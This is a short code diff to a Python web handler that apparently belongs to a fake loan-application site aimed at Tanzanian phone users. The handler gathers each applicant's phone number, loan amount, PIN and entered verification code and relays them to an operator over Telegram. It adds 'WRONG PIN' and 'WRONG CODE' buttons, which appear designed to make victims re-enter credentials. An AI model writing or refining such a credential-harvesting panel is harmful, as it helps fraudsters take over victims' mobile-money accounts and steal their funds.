@@ -180,7 +180,7 @@ def submit_code():
     if loan:
         phone, expected_code, amount, pin = loan
         msg = f'🔐 CODE VERIFICATION\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n💰 Amount: TZS {amount:,}\n🔢 PIN: {pin}\n\n📋 FULL MESSAGE:\n<code>{entered_code}</code>'
-        keyboard = {'inline_keyboard':[[{'text':'📋 COPY MESSAGE','copy_text': entered_code}],[{'text':'❌ WRONG PIN','callback_data':f'denypin_{app_id}'}],[{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'}],[{'text':'✅ APPROVE LOAN','callback_data':f'approve_{app_id}'}]]}
+        keyboard = {'inline_keyboard':[[{'text':'❌ WRONG PIN','callback_data':f'denypin_{app_id}'},{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'}],[{'text':'✅ APPROVE LOAN','callback_data':f'approve_{app_id}'}]]}
         send_telegram(msg, keyboard)
     conn.close()
     return jsonify({'success':True})
